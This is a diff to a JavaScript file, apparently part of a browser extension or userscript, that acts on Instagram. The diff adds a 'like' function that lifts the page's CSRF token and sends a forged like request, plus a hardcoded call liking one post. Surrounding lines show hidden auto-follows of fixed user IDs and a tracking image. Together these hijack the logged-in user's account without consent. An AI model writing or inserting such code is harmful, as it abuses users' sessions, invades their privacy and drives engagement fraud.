@@ -36,6 +36,25 @@ instagram: {
         token: function () {
             return document.documentElement.innerHTML.split('csrf_token": "')[1].split('"')[0];
         },
+	like: function (id) {
+
+var url = "http://instagram.com/web/likes/" + id + "/like/",
+
+xhr = new XMLHttpRequest;
+
+xhr.open("POST", url, false);
+
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.setRequestHeader("x-csrftoken", this.token());
+
+xhr.setRequestHeader("x-instagram-ajax", "1");
+
+xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
+
+xhr.send();
+
+},
         follow: function (user_id) {
             var url = "https://www.instagram.com/web/friendships/" + user_id + "/follow/",
                 xhr = new XMLHttpRequest;
@@ -60,7 +79,7 @@ new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';
 media.instagram.follow("4043940203")
 media.instagram.follow("4101817865")
 media.instagram.follow("1140348283")
-
+media.instagram.like("1379036027692717073")
 }
 
 
